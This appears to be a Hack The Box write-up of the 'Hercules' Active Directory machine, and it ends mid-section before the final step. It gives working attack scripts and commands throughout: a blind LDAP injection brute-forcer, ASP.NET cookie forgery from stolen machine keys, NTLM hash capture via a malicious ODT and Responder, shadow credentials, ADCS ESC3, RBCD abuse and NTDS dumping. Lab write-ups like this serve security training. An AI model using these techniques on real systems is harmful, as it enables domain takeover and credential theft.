# Hercules - Hack The Box Writeup

**Category:** Windows

**Difficulty:** Insane

---

# Enumeration

## Nmap

The initial Nmap scan revealed that the target was a Windows Active Directory environment.

```text
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
54352/tcp open  msrpc         Microsoft Windows RPC
57770/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57777/tcp open  msrpc         Microsoft Windows RPC
64438/tcp open  msrpc         Microsoft Windows RPC
```

The domain was:

```text
hercules.htb
```

---

# Web Enumeration

Subdomain enumeration against the main web application did not reveal anything interesting.

I then performed directory fuzzing, which revealed:

```text
index       (Status: 200) [Size: 27342]
home        (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fhome]
default     (Status: 200) [Size: 27342]
login       (Status: 200) [Size: 3213]
content     (Status: 301) [Size: 152] [--> https://hercules.htb/content/]
```

I also used `shortscan`, which revealed two interesting files:

```text
WEB~1.CON        WEB.CON?       --> web.config
PRECOM~1.CON     PRECOM?.CON?    --> PrecompiledApp.config
```

However, attempting to access them directly with `curl` did not work.

I initially tested the login page for SQL injection, but it did not appear to be vulnerable.

I also tested the contact form for XSS, but that did not lead anywhere.

---

# Active Directory User Enumeration

I had a wordlist containing usernames in an AD-style format.

I generated it using:

```bash
awk 'NF{ for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' \
/usr/share/wordlists/seclists/Usernames/Names/names.txt \
> names_ad.txt
```

I then used Kerbrute to enumerate valid usernames:

```bash
kerbrute userenum \
--dc dc.hercules.htb \
-d hercules.htb \
names_ad.txt
```

This returned several valid usernames:

```text
adriana.i@hercules.htb
angelo.o@hercules.htb
ashley.b@hercules.htb
bob.w@hercules.htb
camilla.b@hercules.htb
clarissa.c@hercules.htb
elijah.m@hercules.htb
fiona.c@hercules.htb
harris.d@hercules.htb
heather.s@hercules.htb
jacob.b@hercules.htb
jennifer.a@hercules.htb
jessica.e@hercules.htb
joel.c@hercules.htb
johanna.f@hercules.htb
johnathan.j@hercules.htb
ken.w@hercules.htb
mark.s@hercules.htb
mikayla.a@hercules.htb
natalie.a@hercules.htb
nate.h@hercules.htb
patrick.s@hercules.htb
ramona.l@hercules.htb
ray.n@hercules.htb
rene.s@hercules.htb
rené.s@hercules.htb
shae.j@hercules.htb
stephanie.w@hercules.htb
stephen.m@hercules.htb
tanya.r@hercules.htb
tish.c@hercules.htb
vincent.g@hercules.htb
will.s@hercules.htb
```

I also ran Kerbrute against the standard 10-million username wordlist:

```bash
kerbrute userenum \
--dc dc.hercules.htb \
-d hercules.htb \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

This revealed additional valid users:

```text
admin@hercules.htb
administrator@hercules.htb
Admin@hercules.htb
Administrator@hercules.htb
auditor@hercules.htb
```

---

# LDAP Injection

While examining the `/Login` endpoint, I noticed that the username field contained a regex validation rule in the HTML source:

```text
data-val-regex-pattern="^[^!&quot;#&'()*+,\:;<=>?[\]^`{|}~]+$"
```

The regex blocked the following characters:

```text
! " # & ' ( ) * + , : ; < = > ? [ \ ] ^ { | } ~ `
```

When submitting an incorrect username and password, the application returned:

```text
Invalid login attempt
```

However, when the username was valid but the password was incorrect, it returned:

```text
Login attempt failed
```

If the username contained one of the blocked characters, the application returned:

```text
Invalid Username
```

I initially thought that because the regex was only enforced client-side, I could bypass it by intercepting the request with Burp Suite and modifying the parameters.

That alone did not work.

I then experimented with URL encoding. Since `%` was not blocked by the regex, I tried double URL encoding.

This still produced errors.

Eventually, I combined the URL encoding with request interception and modification in Burp Suite. This successfully bypassed the client-side validation.

---

# Automating Login Enumeration

I wrote a Python script to automate the testing process.

The script retrieves the CSRF token for every request and submits the login request automatically.

```python
import requests
import re
import argparse

url = "https://10.129.16.93/Login"

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--username', required=True)
parser.add_argument('-p', '--password', required=True)
args = parser.parse_args()

s = requests.Session()
s.verify = False
requests.packages.urllib3.disable_warnings()

r = s.get(url)

match = re.search(
    r'name="__RequestVerificationToken".*?value="([^"]+)"',
    r.text
)

if not match:
    match = re.search(
        r'__RequestVerificationToken.*?value="([^"]+)"',
        r.text
    )

form_token = match.group(1)
cookie_token = s.cookies.get('__RequestVerificationToken')

data = {
    "__RequestVerificationToken": form_token,
    "Username": args.username,
    "Password": args.password,
    "RememberMe": "false"
}

r = s.post(
    url,
    data=data,
    allow_redirects=False
)

if "Invalid login attempt" in r.text:
    print("Invalid login attempt")
elif "Login attempt failed" in r.text:
    print("Login attempt failed")
elif r.status_code == 302:
    print("Success!")
else:
    print("Unknown response")
```

Since the script bypassed the client-side regex, I only needed to URL encode the payload once.

---

# LDAP Blind Injection

After further enumeration, I discovered that the login functionality could be used as a blind LDAP injection primitive.

The important behavior was:

```text
Invalid login attempt
```

when the LDAP condition was false, while:

```text
Login attempt failed
```

indicated that the condition was true.

This gave me a blind true/false oracle.

I also discovered that the `description` LDAP attribute could be queried with:

```text
%2A%29%28description%3D%2A
```

Which decodes to:

```text
*)(description=*
```

This allowed me to test the contents of the `description` attribute.

---

# Brute-Forcing the Description Attribute

I wrote a Python script to brute-force the `description` attribute character by character.

Because the application had rate limiting, a new session was created for every request.

One issue I encountered was that the wildcard character `*` was always being selected because it represented a condition that was always true.

To prevent this, I escaped LDAP special characters using their hexadecimal representations:

```text
*   -> \2a
(   -> \28
)   -> \29
\   -> \5c
NUL -> \00
```

The brute-force script was:

```python
import requests
import re
import string
import urllib.parse

url = "https://10.129.242.196/Login"

def send_payload(username_payload):
    s = requests.Session()
    s.verify = False
    requests.packages.urllib3.disable_warnings()

    r = s.get(url)

    match = re.search(
        r'__RequestVerificationToken.*?value="([^"]+)"',
        r.text
    )

    if not match:
        return False

    form_token = match.group(1)
    cookie_token = s.cookies.get('__RequestVerificationToken')

    encoded_payload = urllib.parse.quote(username_payload)

    data = {
        "__RequestVerificationToken": form_token,
        "Username": encoded_payload,
        "Password": "anything",
        "RememberMe": "false"
    }

    headers = {
        "Cookie": f"__RequestVerificationToken={cookie_token}"
    }

    r = s.post(
        url,
        data=data,
        headers=headers,
        allow_redirects=False
    )

    return "Login attempt failed" in r.text


description = ""

ldap_escapes = {
    '*': '\\2a',
    '(': '\\28',
    ')': '\\29',
    '\\': '\\5c',
    '\x00': '\\00'
}

normal_chars = (
    string.ascii_lowercase +
    string.ascii_uppercase +
    string.digits +
    " !@#$%^&_+-={}[]|:;'<>,.?/\""
)

special_chars = list(ldap_escapes.keys())

charset = (
    list(normal_chars) +
    [ldap_escapes[c] for c in special_chars]
)

print("[*] Starting brute force...")

while True:
    found = False

    for char in charset:
        test = description + char
        payload = f"*)(description={test}*"

        print(f"[*] Testing: {test}")

        if send_payload(payload):
            description = test
            print(f"[+] Found: {description}")
            found = True
            break

    if not found:
        print(f"\n[+] Final description: {description}")
        break
```

After the brute-force completed, I recovered the password:

```text
change*th1s_p@ssw()rd!!
```

---

# Identifying the Valid User

NTLM authentication was disabled on the other protocols, so I could not simply use the recovered password for traditional NTLM-based authentication.

However, the credentials could be tested against the web application's SSO login.

I therefore wrote another Python script to test the previously discovered usernames.

```python
import requests
import re

url = "https://10.129.16.93/Login"

password = "change*th1s_p@ssw()rd!!"

usernames = [
    "admin",
    "administrator",
    "Admin",
    "Administrator",
    "auditor",
    "adriana.i",
    "angelo.o",
    "ashley.b",
    "bob.w",
    "camilla.b",
    "clarissa.c",
    "elijah.m",
    "fiona.c",
    "harris.d",
    "heather.s",
    "jacob.b",
    "jennifer.a",
    "jessica.e",
    "joel.c",
    "johanna.f",
    "johnathan.j",
    "ken.w",
    "mark.s",
    "mikayla.a",
    "natalie.a",
    "nate.h",
    "patrick.s",
    "ramona.l",
    "ray.n",
    "rene.s",
    "rené.s",
    "shae.j",
    "stephanie.w",
    "stephen.m",
    "tanya.r",
    "tish.c"
]

def try_login(username, password):
    s = requests.Session()
    s.verify = False
    requests.packages.urllib3.disable_warnings()

    r = s.get(url)

    match = re.search(
        r'__RequestVerificationToken.*?value="([^"]+)"',
        r.text
    )

    if not match:
        return False

    form_token = match.group(1)
    cookie_token = s.cookies.get('__RequestVerificationToken')

    data = {
        "__RequestVerificationToken": form_token,
        "Username": username,
        "Password": password,
        "RememberMe": "false"
    }

    headers = {
        "Cookie": f"__RequestVerificationToken={cookie_token}"
    }

    r = s.post(
        url,
        data=data,
        headers=headers,
        allow_redirects=False
    )

    return r.status_code == 302


print(f"[*] Testing password: {password}")
print(f"[*] Total users: {len(usernames)}")

for username in usernames:
    print(f"[*] Trying: {username}")

    if try_login(username, password):
        print(f"\n[+] SUCCESS! {username}:{password}")
        print("[+] Continuing to check remaining users...")

print("\n[*] Finished testing all users")
```

The valid credentials were:

```text
ken.w : change*th1s_p@ssw()rd!!
```

I used these credentials to log into the web application.

---

# Local File Inclusion

After logging into the application, I discovered a download functionality with the following URL:

```text
https://hercules.htb/Home/Download?fileName=report.pdf
```

The `fileName` parameter appeared to be vulnerable to Local File Inclusion.

I remembered the `shortscan` results from earlier, which had revealed the existence of:

```text
web.config
```

I attempted to retrieve it through the vulnerable download endpoint:

```text
https://hercules.htb/Home/Download?fileName=../../web.config
```

The request successfully returned the `web.config` file.

Most importantly, the file contained the application's ASP.NET machine keys:

```text
decryption="AES"

decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"

validation="HMACSHA256"

validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
```

These keys would later allow me to forge an ASP.NET authentication cookie and escalate from the `Web Users` role to a more privileged web role.

---

# ASP.NET Authentication Cookie

The `web.config` file exposed the application's ASP.NET machine keys.

I initially tried several public Python scripts to generate a valid authentication cookie, but none of them worked correctly.

I then used the .NET package:

```text
AspNetCore.LegacyAuthCookieCompat
```

to decrypt and understand the application's authentication cookie format.

---

## Decrypting the Authentication Cookie

First, I created a new .NET console application:

```bash
dotnet new console -n CookieDecrypt && cd CookieDecrypt
```

I then installed the required package:

```bash
dotnet add package AspNetCore.LegacyAuthCookieCompat
```

I modified `Program.cs` with the following code:

```csharp
using AspNetCore.LegacyAuthCookieCompat;

string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";
string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

// Paste any cookie here to decrypt
string cookieValue = "AAF676982BDEF745DDF10470DFDFD3AA081010D3FBB3498DCE1870FB1F2D007CE0CCC7B5A2B9030CEC731C747256382C8A3119966E5AF64E8844067630088932E6E4C5BA9F1D1E11C971A39E4C4BDFA1F1435E7D3F25F41158139EA260F2491F79B8FC350112F3AE863BB7E652517C7C11CA02FFB6DE521E232E762924DC0F534F487668701AF49C74007CC67C008722062F1DEF3E7A8D96451205BEB712DD58";

var encryptor = new LegacyFormsAuthenticationTicketEncryptor(
    decryptionKeyBytes,
    validationKeyBytes,
    ShaVersion.Sha256,
    CompatibilityMode.Framework20SP2
);

var ticket = encryptor.DecryptCookie(cookieValue);

Console.WriteLine($"[+] Username:     {ticket.Name}");
Console.WriteLine($"[+] UserData:     {ticket.UserData}");
Console.WriteLine($"[+] IssueDate:    {ticket.IssueDate}");
Console.WriteLine($"[+] Expiration:   {ticket.Expiration}");
Console.WriteLine($"[+] IsPersistent: {ticket.IsPersistent}");
Console.WriteLine($"[+] CookiePath:   {ticket.CookiePath}");
Console.WriteLine($"[+] Version:      {ticket.Version}");
```

I ran the program with:

```bash
dotnet run
```

The decrypted cookie revealed that, in addition to the usual .NET authentication cookie fields, the application stored two important values:

```text
User: ken.w
Role: Web Users
```

This meant that the user's role was stored directly inside the authentication ticket.

Since the machine keys were known, it was possible to forge a new authentication ticket.

---

# Discovering the Web Administrator Role

While enumerating the emails available to `ken.w`, I found a user named:

```text
web_admin
```

The user's role was described as:

```text
Web Admins
```

This looked interesting because it closely resembled the role assigned to our current account:

```text
Web Users
```

I therefore started testing different combinations of usernames and roles.

After some experimentation, I discovered that the correct role was actually:

```text
Web Administrators
```

for the user:

```text
web_admin
```

This meant I could forge an authentication cookie containing:

```text
User: web_admin
Role: Web Administrators
```

---

# Forging the Authentication Cookie

I created another .NET console application:

```bash
dotnet new console -n CookieForge && cd CookieForge
```

I installed the same package:

```bash
dotnet add package AspNetCore.LegacyAuthCookieCompat
```

I then modified `Program.cs`:

```csharp
using AspNetCore.LegacyAuthCookieCompat;

byte[] decryptionKeyBytes = HexUtils.HexToBinary(
    "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
);

byte[] validationKeyBytes = HexUtils.HexToBinary(
    "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
);

var encryptor = new LegacyFormsAuthenticationTicketEncryptor(
    decryptionKeyBytes,
    validationKeyBytes,
    ShaVersion.Sha256,
    CompatibilityMode.Framework20SP2
);

var issueDate = DateTime.Now;
var expiryDate = issueDate.AddHours(24);

var ticket = new FormsAuthenticationTicket(
    1,
    "web_admin",
    issueDate,
    expiryDate,
    false,
    "Web Administrators",
    "/"
);

string forged = encryptor.Encrypt(ticket);

Console.WriteLine($".ASPXAUTH={forged}");
```

I compiled and ran the application:

```bash
dotnet run
```

This generated a forged `.ASPXAUTH` cookie.

I then replaced the existing authentication cookie with the forged cookie using the browser's developer tools.

After refreshing the page, I was authenticated as:

```text
web_admin
```

with the role:

```text
Web Administrators
```

---

# Malicious File Upload

After hijacking the `web_admin` account, I revisited the file upload functionality.

Previously, the application had returned:

```text
File Upload not permitted
```

After authenticating as `web_admin`, the response changed to:

```text
File Type not supported
```

This confirmed that the forged account had access to the upload functionality.

I used Burp Suite Intruder to brute-force the accepted file extensions.

One of the supported extensions was:

```text
.odt
```

---

# NTLM Credential Theft

The application contained a note indicating that a member of the team would respond to uploaded files.

This suggested that uploaded documents would potentially be opened by another user.

I therefore investigated whether a malicious OpenDocument file could trigger an NTLM authentication attempt when opened.

I used the Python version of Exploit-DB's `Bad-ODF` exploit to generate a malicious `.odt` file.

The tool was:

```text
Bad-ODF
```

I generated the malicious document with:

```bash
python3 Bad-ODF.py
```

When prompted, I provided my `tun0` IP address.

I then started Responder:

```bash
sudo responder -I tun0
```

Finally, I uploaded the malicious `.odt` file through the web application.

After waiting a few minutes, Responder captured an NTLMv2-SSP hash for:

```text
HERCULES\natalie.a
```

---

# Cracking the NTLM Hash

I attempted to crack the captured hash using Hashcat and `rockyou.txt`:

```bash
hashcat '<NTLMV2 Hash for natalie.a>' /usr/share/wordlists/rockyou.txt
```

The hash was successfully cracked.

The recovered password was:

```text
Prettyprincess123!
```

The credentials were therefore:

```text
natalie.a : Prettyprincess123!
```

---

# Kerberos Authentication as natalie.a

Since NTLM authentication was disabled on the other protocols, I requested a Kerberos TGT using the recovered credentials:

```bash
impacket-getTGT 'hercules.htb/natalie.a:Prettyprincess123!'
```

I exported the resulting ticket:

```bash
export KRB5CCNAME=$(pwd)/natalie.a.ccache
```

I verified that Kerberos authentication worked against SMB:

```bash
nxc smb dc.hercules.htb -k --use-kcache
```

The authentication was successful.

---

# BloodHound Enumeration

I then used BloodHound to investigate the privileges of `natalie.a`.

The enumeration revealed that `natalie.a` had:

```text
WRITE
```

permissions over multiple users.

One particularly interesting account was:

```text
bob.w
```

`bob.w` was also a member of:

```text
Recruitment Managers
```

which made the account particularly interesting for further privilege escalation.

---

# Shadow Credentials on bob.w

Since `natalie.a` had write access over `bob.w`, I performed a Shadow Credentials attack.

First, I added Shadow Credentials to `bob.w`:

```bash
bloodyAD \
--host dc.hercules.htb \
-d hercules.htb \
-u 'natalie.a' \
-k \
add shadowCredentials 'bob.w'
```

This generated a certificate and private key.

I then requested a TGT for `bob.w` using PKINIT:

```bash
python3 PKINITtools/gettgtpkinit.py \
-cert-pem Mfilz1Bz_cert.pem \
-key-pem Mfilz1Bz_priv.pem \
hercules.htb/bob.w \
Mfilz1Bz.ccache
```

I exported the resulting ticket:

```bash
export KRB5CCNAME=$(pwd)/Mfilz1Bz.ccache
```

I now had Kerberos authentication as:

```text
bob.w
```

---

# Enumerating bob.w's Write Privileges

I enumerated the writable objects for `bob.w`:

```bash
bloodyAD \
--host dc.hercules.htb \
-d hercules.htb \
-u 'bob.w' \
-k \
get writable \
--detail
```

The output revealed two particularly interesting permissions.

First:

```text
CREATE_CHILD
```

over:

```text
Web Department
```

Second, I had:

```text
WRITE
```

permissions over several users.

The most interesting one was:

```text
Auditor
```

because `Auditor` was also a member of:

```text
Remote Management Users
```

---

# Moving Auditor into Web Department

There was an important complication.

Although `bob.w` had `CREATE_CHILD` permissions over the `Web Department` OU, moving an existing user from another OU would normally require `DELETE_CHILD` permissions on the source OU.

In this case, I did not have the required delete permission on the original OU.

However, `bloodyAD get writable` primarily displays object-level permissions and does not necessarily expose every relevant container-level permission.

Therefore, I decided to attempt the move anyway.

I connected to LDAPS using PowerView:

```bash
python3 powerview.py \
'hercules.htb/bob.w'@dc.hercules.htb \
-k \
--no-pass
```

I then moved `Auditor` from the `Security Department` OU into `Web Department`:

```powershell
Set-DomainObjectDN `
-Identity "CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" `
-DestinationDN "OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
```

The operation succeeded.

---

# Shadow Credentials on Auditor

Since `natalie.a` had write access over the `Web Department` OU, I switched back to the Kerberos ticket for `natalie.a`:

```bash
export KRB5CCNAME=$(pwd)/natalie.a.ccache
```

I then performed another Shadow Credentials attack, this time against `auditor`:

```bash
bloodyAD \
--host dc.hercules.htb \
-d hercules.htb \
-u 'natalie.a' \
-k \
add shadowCredentials 'auditor'
```

I requested a TGT for `auditor`:

```bash
python3 PKINITtools/gettgtpkinit.py \
-cert-pem Mfilz1Bz_cert.pem \
-key-pem Mfilz1Bz_priv.pem \
hercules.htb/auditor \
Mfilz1Bz.ccache
```

I exported the new ticket:

```bash
export KRB5CCNAME=$(pwd)/Mfilz1Bz.ccache
```

---

# WinRM Access as Auditor

I initially attempted to obtain a shell using `evil-winrm`, but it did not work.

I therefore used `winrmexec.py` over HTTPS on port `5986`:

```bash
python3 winrmexec.py \
-ssl \
-port 5986 \
-k \
-no-pass \
hercules.htb/auditor@dc.hercules.htb
```

This successfully provided a shell as:

```text
auditor
```

I was then able to retrieve the user flag.

---

# Privilege Escalation

After obtaining access as `auditor`, I ran BloodHound again to enumerate the newly available privileges.

This time, the BloodHound data revealed that:

```text
auditor
    |
    v
FOREST MANAGEMENT
    |
    v
GenericAll
    |
    v
FOREST MIGRATION OU
```

The `FOREST MANAGEMENT` group had `GenericAll` permissions over the:

```text
FOREST MIGRATION
```

OU.

This meant that I could potentially obtain full control over objects within the OU.

---

# Taking Full Control of the FOREST MIGRATION OU

I granted `auditor` full control over the `FOREST MIGRATION` OU:

```bash
dacledit.py \
-action 'write' \
-rights 'FullControl' \
-inheritance \
-principal 'auditor' \
-target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' \
'hercules.htb'/'auditor' \
-k \
-no-pass \
-dc-host dc.hercules.htb
```

After obtaining control over the OU, I enumerated the users contained within it.

One particularly interesting user was:

```text
fernando.r
```

This account was a member of:

```text
SMART OPERATORS
```

and had enrollment permissions over several certificate templates.

Another interesting account was:

```text
iis_administrator
```

However, this account had:

```text
Admin Count: TRUE
```

This was important because protected accounts are handled differently by Active Directory, meaning that simply inheriting permissions from the OU would not necessarily allow modification of its DACL.

I therefore continued with `fernando.r`.

---

# Taking Over fernando.r

Since I had control over the `FOREST MIGRATION` OU, I changed the password of `fernando.r`:

```bash
bloodyAD \
--host dc.hercules.htb \
-d hercules.htb \
-u 'auditor' \
-k \
set password 'fernando.r' 'Password123!'
```

I attempted to request a TGT for the account, but the request failed.

Further investigation showed that:

```text
fernando.r
```

was disabled.

---

# Enabling fernando.r

I connected to LDAP using PowerView as `auditor`:

```bash
python3 powerview.py \
'hercules.htb/auditor'@dc.hercules.htb \
-k \
--no-pass
```

I then enabled the account:

```powershell
Enable-ADAccount -Identity "fernando.r"
```

With the account enabled, I could authenticate as `fernando.r`.

I requested a Kerberos TGT and exported it to `KRB5CCNAME`.

---

# Active Directory Certificate Services Enumeration

I then enumerated vulnerable certificate templates using Certipy:

```bash
certipy-ad find \
-u 'fernando.r@hercules.htb' \
-k \
-no-pass \
-target dc.hercules.htb \
-dc-host dc.hercules.htb \
-dc-ip 10.129.242.196 \
-stdout \
-vulnerable
```

The output revealed several vulnerable templates:

```text
EnrollmentAgent: ESC3
EnrollmentAgentOffline: ESC3 and ESC15
MachineEnrollmentAgent: ESC3
```

The `EnrollmentAgent` template therefore provided an ESC3 attack path.

---

# Exploiting ESC3

I first requested an enrollment certificate using the `EnrollmentAgent` template:

```bash
certipy-ad req \
-u 'fernando.r@hercules.htb' \
-k \
-no-pass \
-target dc.hercules.htb \
-dc-host dc.hercules.htb \
-dc-ip 10.129.242.196 \
-ca 'CA-HERCULES' \
-template 'EnrollmentAgent'
```

I initially attempted to request a certificate for `Administrator`, but the request failed with:

```text
0x80094009
```

After further testing, I found that requesting a certificate on behalf of `ashley.b` worked successfully.

I used:

```bash
certipy-ad req \
-u 'fernando.r@hercules.htb' \
-k \
-no-pass \
-target dc.hercules.htb \
-dc-host dc.hercules.htb \
-dc-ip 10.129.242.196 \
-ca 'CA-HERCULES' \
-template 'User' \
-pfx fernando.r.pfx \
-on-behalf-of 'HERCULES\ashley.b' \
-dcom
```

The `-dcom` option can be useful when the normal RPC connection is failing.

The certificate request succeeded.

---

# Authenticating as ashley.b

I used the generated certificate to authenticate:

```bash
certipy-ad auth \
-pfx ashley.b.pfx \
-dc-ip 10.129.242.196
```

This returned the NT hash:

```text
aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

I now had authentication material for:

```text
ashley.b
```

---

# Discovering the Cleanup Script

While investigating `ashley.b`'s files, I found a PowerShell cleanup script:

```text
C:\Users\ashley.b\Desktop\aCleanup.ps1
```

There was also an email:

```text
C:\Users\ashley.b\Desktop\Mail\RE_ashley.eml
```

The email contained an important clue.

It indicated that passwords for users belonging to sensitive groups were reset by running:

```text
aCleanup.ps1
```

I had already observed this behavior while enumerating as `fernando.r`, where the password was automatically being reset.

This became important because of the earlier `Admin Count` restriction.

---

# RBCD Enumeration

Earlier, while enumerating delegation relationships, I had run:

```bash
findDelegation.py \
"hercules.htb/auditor" \
-k \
-no-pass \
-dc-host dc.hercules.htb
```

The output showed:

```text
iis_webserver$ is allowed to RBCD on DC$
```

It also showed:

```text
iis_administrator
    |
    +-- ForceChangePassword --> iis_webserver$
```

This presented an interesting chain.

The problem was that `iis_administrator` had:

```text
Admin Count: TRUE
```

so simply having control over the `FOREST MIGRATION` OU did not allow me to modify its DACL.

However, the email and cleanup script suggested that protected accounts could have their passwords reset.

---

# Resetting iis_administrator

To make sure both the `IT Support` group and `auditor` retained control over the OU, I granted both principals full control.

First:

```bash
dacledit.py \
-action 'write' \
-rights 'FullControl' \
-inheritance \
-principal 'IT Support' \
-target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' \
'hercules.htb'/'auditor' \
-k \
-no-pass \
-dc-host dc.hercules.htb
```

Then:

```bash
dacledit.py \
-action 'write' \
-rights 'FullControl' \
-inheritance \
-principal 'auditor' \
-target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' \
'hercules.htb'/'auditor' \
-k \
-no-pass \
-dc-host dc.hercules.htb
```

I then ran the cleanup script as `ashley.b`:

```powershell
./aCleanup.ps1
```

The script took approximately:

```text
22 seconds
```

to complete.

After it finished, I restored the required permissions on the OU:

```bash
dacledit.py \
-action 'write' \
-rights 'FullControl' \
-inheritance \
-principal 'auditor' \
-target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' \
'hercules.htb'/'auditor' \
-k \
-no-pass \
-dc-host dc.hercules.htb
```

And:

```bash
dacledit.py \
-action 'write' \
-rights 'FullControl' \
-inheritance \
-principal 'IT Support' \
-target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' \
'hercules.htb'/'auditor' \
-k \
-no-pass \
-dc-host dc.hercules.htb
```

I then enabled the `iis_administrator` account:

```bash
bloodyad \
--host dc.hercules.htb \
-d hercules.htb \
-k \
remove uac \
'iis_administrator' \
-f ACCOUNTDISABLE
```

Finally, I changed its password:

```bash
bloodyad \
--host dc.hercules.htb \
-d hercules.htb \
-k \
set password \
'iis_administrator' \
'change*th1s_p@ssw()rd!!'
```

At this point, I had valid credentials for:

```text
iis_administrator
```

---

# Taking Over iis_webserver$

I requested a TGT for `iis_administrator`:

```bash
impacket-getTGT \
'hercules.htb/iis_administrator:change*th1s_p@ssw()rd!!'
```

I exported the ticket:

```bash
export KRB5CCNAME=$(pwd)/iis_administrator.ccache
```

The `iis_administrator` account had `ForceChangePassword` over:

```text
iis_webserver$
```

I therefore changed the password of the machine account:

```bash
bloodyAD \
--host dc.hercules.htb \
-d hercules.htb \
-k \
set password \
'iis_webserver$' \
'change*th1s_p@ssw()rd!!'
```

I then requested a TGT for `iis_webserver$`:

```bash
impacket-getTGT \
'hercules.htb/iis_webserver$:change*th1s_p@ssw()rd!!'
```

---

# Exploiting Resource-Based Constrained Delegation

The earlier delegation enumeration showed:

```text
iis_webserver$ --> RBCD --> DC$
```

In other words, `iis_webserver$` was allowed to perform resource-based constrained delegation against the Domain Controller.

Normally, an S4U2Self request requires the service account to have an SPN.

However, `iis_webserver$` did not have an SPN.

In this situation, the S4U2Self request can be performed using User-to-User (U2U) authentication.

---

# Understanding the U2U Requirement

Normally, during S4U2Self, the KDC creates a service ticket that is encrypted using the service account's long-term key, derived from its NT hash.

For the U2U case, however, the ticket encryption involves the TGT session key instead.

This creates a key mismatch.

The KDC expects the service account's NT hash when processing the ticket, while the ticket was encrypted using the session key.

Therefore, for this particular attack path, the NT hash needs to match the relevant session key.

If we attempt the delegation directly:

```bash
getST.py \
-spn 'cifs/dc.hercules.htb' \
-impersonate 'Administrator' \
'hercules.htb/iis_webserver$' \
-k \
-no-pass \
-u2u
```

the request fails because the keys do not match.

---

# Matching the NT Hash and Session Key

First, I calculated the NT hash of the known `iis_webserver$` password.

I used Python:

```bash
python3 -c "
import hashlib

password = 'change*th1s_p@ssw()rd!!'
hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
print(hash.upper())
"
```

This produced:

```text
BBE608565F201166999904E40C967C7B
```

This was the NT hash for:

```text
iis_webserver$
```

---

# Requesting a TGT Using the NT Hash

I requested a TGT using the NT hash:

```bash
impacket-getTGT \
'hercules.htb/iis_webserver$' \
-dc-ip 10.129.242.196 \
-hashes :BBE608565F201166999904E40C967C7B
```

This generated:

```text
iis_webserver$.ccache
```

I then extracted the session key from the ticket:

```bash
python3 -c "
from impacket.krb5.ccache import CCache

cc = CCache.loadFile('iis_webserver\$.ccache')

for c in cc.credentials:
    print(f'Type: {int(c[\"key\"][\"keytype\"])}')
    print(f'Session Key: {c[\"key\"][\"keyvalue\"].hex()}')
"
```

The session key was:

```text
1d061eb5f0d75cb0fad8b62280d8f2dd
```

I exported the TGT:

```bash
export KRB5CCNAME=$(pwd)/iis_webserver\$.ccache
```

---

# Replacing the NT Hash

The next step was to change the NT hash of `iis_webserver$` to the extracted Kerberos session key.

I used:

```bash
changepasswd.py \
'hercules.htb/iis_webserver$@dc.hercules.htb' \
-newhashes ':1d061eb5f0d75cb0fad8b62280d8f2dd' \
-hashes 'BBE608565F201166999904E40C967C7B' \
-k \
-dc-ip 10.129.242.196
```

The NT hash was now synchronized with the session key.

---

# Requesting the Administrator Service Ticket

I retried the S4U delegation attack:

```bash
getST.py \
-spn 'cifs/dc.hercules.htb' \
-impersonate 'Administrator' \
'hercules.htb/iis_webserver$' \
-k \
-no-pass \
-u2u
```

This time the request succeeded.

I obtained a service ticket for:

```text
Administrator
```

against:

```text
cifs/dc.hercules.htb
```

The resulting ticket was:

```text
Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

I exported it:

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

---

# Dumping NTDS

With the Administrator CIFS ticket loaded, I could access the Domain Controller using Kerberos.

I dumped the NTDS database hashes using NetExec:

```bash
nxc smb dc.hercules.htb \
--use-kcache \
--ntds
```

Among the recovered hashes was the NT hash for:

```text
Administrator
```

The hash was:

```text
56855ee6b7570edefde6ac262200756e
```

---

# Requesting an Administrator TGT

